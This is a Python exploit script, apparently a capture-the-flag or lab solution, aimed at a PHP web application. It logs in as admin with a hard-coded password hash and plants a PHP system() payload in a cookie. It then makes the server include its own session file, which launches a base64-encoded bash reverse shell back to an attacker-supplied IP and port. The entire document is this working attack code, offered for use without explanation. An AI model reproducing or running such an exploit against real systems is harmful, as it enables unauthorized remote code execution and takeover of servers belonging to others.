import argparse
import requests
import urllib.parse
import base64

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help='ip of the machine')
parser.add_argument('-i', '--ip', help='attacker machine ip')
parser.add_argument('-p', '--port', help='port for reverse shell')
args = parser.parse_args()

timeout = 2
d = {'username': 'admin', 'password': '8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918'}

s = requests.Session()
try:
    target = f'http://{args.target}/'
    r = s.post(target + 'authenticate.php', data=d, timeout=timeout)
    cookie = s.cookies.get_dict().get('PHPSESSID')

    rev_shell = f'bash -i >& /dev/tcp/{args.ip}/{args.port} 0>&1'.encode()

    if r.status_code == 200:
        d = {'search': '/var/lib/php/sessions/sess_' + str(cookie)}
        s.cookies.set('user_pref', None)
        s.cookies.set('user_pref', urllib.parse.quote_plus(f'<?php system(\'echo {base64.b64encode(rev_shell).decode("utf-8")} | base64 -d | bash\'); ?>'))
        s.post(target + 'home.php', data=d, timeout=timeout)
        s.post(target + 'home.php', data=d, timeout=timeout)
        print('Triggering reverse shell')
except requests.exceptions.Timeout:
    print('Done')
